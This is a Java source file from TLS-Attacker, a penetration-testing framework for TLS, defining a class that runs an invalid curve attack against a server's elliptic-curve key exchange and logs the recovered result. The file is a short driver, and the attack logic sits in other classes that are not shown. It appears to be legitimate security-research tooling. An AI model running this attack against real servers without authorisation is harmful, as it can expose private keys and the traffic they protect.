/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackFullCommandConfig;
import de.rub.nds.tlsattacker.attacks.ec.ICEAttacker;
import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.crypto.ec.Curve;
import de.rub.nds.tlsattacker.tls.crypto.ec.CurveFactory;
import de.rub.nds.tlsattacker.tls.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsConfig;
import java.math.BigInteger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * 
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class InvalidCurveAttackFull extends Attacker<InvalidCurveAttackFullCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(InvalidCurveAttackFull.class);

    public InvalidCurveAttackFull(InvalidCurveAttackFullCommandConfig config) {
        super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
        TlsConfig tlsConfig = configHandler.initialize(config);
        if (tlsConfig.getNamedCurves().size() > 1) {
            throw new ConfigurationException("Please specify only one named curve which should be attacked");
        }

        LOGGER.info("Executing attack against the server with named curve {}", tlsConfig.getNamedCurves().get(0));

        Curve curve = CurveFactory.getNamedCurve(tlsConfig.getNamedCurves().get(0).name());
        RealDirectMessageECOracle oracle = new RealDirectMessageECOracle(tlsConfig, curve);
        ICEAttacker attacker = new ICEAttacker(oracle, config.getServerType(), config.getAdditionalEquations());
        attacker.attack();
        BigInteger result = attacker.getResult();

        LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Result found: {}", result);
    }

}
